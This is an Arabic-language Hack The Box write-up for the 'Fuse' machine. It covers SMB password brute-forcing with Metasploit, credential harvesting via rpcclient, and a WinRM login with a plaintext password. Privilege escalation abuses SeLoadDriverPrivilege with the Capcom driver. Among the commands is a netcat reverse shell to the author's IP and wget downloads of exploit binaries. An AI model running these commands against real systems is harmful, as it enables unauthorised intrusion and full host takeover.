Created by fasto

My profile : https://www.hackthebox.eu/home/users/profile/

**_Sammmry:_**

![Desktop View](/img/fuse/b.jpeg)

```
شيقة جدا نبدا بجمع machine هي fuse السلام عليكم اليوم ساقوم بشرح
للحصول على يوزر بعد ذلك نستغل brutforceمعلومات ثم نقوم ب
admininistratorلنحصل على صلاحيات seLoadDriver
```

   - 1.1 Nmap
- 2 Port
   - 2.1 Fuse. fabricorp.local
- 3 User
   - 3.1 brutforce
   - 3.2 Smbpasswd
   - 3.3 rpcclient
   - 3.4 User brutforce
- 4 Privilege escalation
   - 4.1 SeLoadDriverPrivilege
   - 4.2 Compile
   - 4.3 exploit


Recon

### 1.1 Nmap

```
nmap نبدا بفحص البورتات باستخدام
```
![Desktop View](/img/fuse/1.png)
## 2 Port

### 2.1 Fuse. fabricorp.local

#### نلاحظ وجود البورت 80 الخاص بالويب سيرفر مفتوح 

```
fuse.fabricorp.local عند التصفح يقوم السيرفر بتحويلنا الى هذا الدومين 
/etc/hosts نضيف هذا الدومين في ملف
: ثم نقوم بفتحه على المتصفح
```
![Desktop View](/img/fuse/2.png)
#### بعد ذلك نقوم بجمع المعلومات نجد بعض اليوزرس
![Desktop View](/img/fuse/3.png)

```
 ثم نقوم بسحب كلمات من الدومين user.txt نضع هذه اليوزرس في ملف
باستخدام الامر التالي brutforceلاستعمالها في 
```
cewl -d 5 -m 3 -w wordlist
[http://fuse.fabricorp.local/papercut/logs/html/index.htm](http://fuse.fabricorp.local/papercut/logs/html/index.htm)

## 3 User

### 3.1 brutforce

![Desktop View](/img/fuse/4.png)
```
msconsole نقوم بتشغيل الميتاسبلويت بالامر
: ثم
```

```
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.
set user_file user.txt
set pass_file wordlist
run

```


![Desktop View](/img/fuse/5.png)


![Desktop View](/img/fuse/6.png)



### 3.2 Smbpasswd

#### الان حصلنا على اسم مستخدم وكلمة سر لنقوم بتجريبها

```
smbclient -L fuse.htb -U tlavel
يخبرنا انه علينا تغير كلمة samabaعندما نحاول الاتصال ب
: السر نغير كلمة السر باستخدام الامر التالي
smbpasswd -r fuse.htb -U tlavel
```
![Desktop View](/img/fuse/7.png)

### 3.3 rpcclient

 #### : ثم نتصل باستخدام الامر التالي بكلمة السر الجديدة

rpcclient -U FABRICORP\\tlavel 10.10.10.193

```
نسحب اليوزرس
```
rpcclient $> enumdomusers

```
نسحب كلمة المرور
```
rpcclient $> enumprinters

![Desktop View](/img/fuse/8.png)


### 3.4 User brutforce

![Desktop View](/img/fuse/9.png)

```
user.txtنضع اليوزرس في ملف
cut ثم نقوم بالتعديل عليه باستخدام
مرة اخرى بالميتاسبلويت brutforce ثم نقوم بعمل
وكلمة السر users.txt لملف
```

‫‪$fab@s3Rv1ce$1‬‬

![Desktop View](/img/fuse/10.png)


#### الان وجدنا اليوزر و كلمة السر نقوم ب الدخول الى السيرفر

```
:بالامر التالي evil-winrm باستخدام
```
evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i
fuse.htb


## 4 Privilege escalation

![Desktop View](/img/fuse/11.png)

```
whoami /all نكتب الامر
```

### 4.1 SeLoadDriverPrivilege

“Load and unload device drivers” policy

SeLoadDriverPrivilege Load and unload device drivers Enabled

```
: بالبحث في جوجل نجد مقال جيد يتحدث عن الاستغلال
https://www.tarlogic.com/en/blog/abusing-
/seloaddriverprivilege-for-privilege-escalation
: من هنا eoploaddriver.cpp نقوم بتحميل
https://raw.githubusercontent.com/TarlogicSecurit
y/EoPLoadDriver/master/eoploaddriver.cpp
: من هنا ExploitCapcom.cpp و
https://github.com/tandasat/ExploitCapcom
visual studio ب compile نعمل لهم
:او يمكنك تحميل الملفات الخاصة بي من هنا
```
https://github.com/FASTO96/hackthebox/blob/master/Fuse/fuse.zip

### 4.2 Compile


```
exploitCapcom.cppل compile نقوم بعمل
```



```
الى مكان ا C:\\Windows\\system32\\cmd.exe مع تغير
c:\\temp\\fasto.bat الخاص بنا shell
```




![Desktop View](/img/fuse/12.PNG)





<br>  





![Desktop View](/img/fuse/13.png)






```
: Fasto.bat
```
c:\temp\nc64.exe 10.10.14.212 1337 -e powershell.exe

```
الخاص بك ip غير 10.10.14.212 الى 
```

#### نقوم برفع الملفات على السيرفر 

```
python serverاولا نشغل
```
![Desktop View](/img/fuse/14.png)


```
c:\تحت temp  ثم ننشا مجلد باسم 

: لاوامرا wgetثم نقوم بالرفع في هذا المجلد باستخدام
```




```
wget http://10.10.14.212/Capcom.sys -O Capcom.sys
wget http://10.10.14.212/ExploitCapcom.exe -O ExploitCapcom.exe
wget http://10.10.14.212/fasto.bat -O fasto.bat
wget http://10.10.14.212/nc64.exe -O nc64.exe
wget http://10.10.14.212/Eoploaddriver.exe -O Eoploaddriver.exe

```











![Desktop View](/img/fuse/15.png)


### 4.3 exploit

#### الان نقوم بالاستغلال

.\Eoploaddriver.exe System\CurrentControlSet\MyService C:\temp\capcom.sys
.\ExploitCapcom.exe

![Desktop View](/img/fuse/16.png)




![Desktop View](/img/fuse/17.png)


![Desktop View](/img/fuse/18.png)


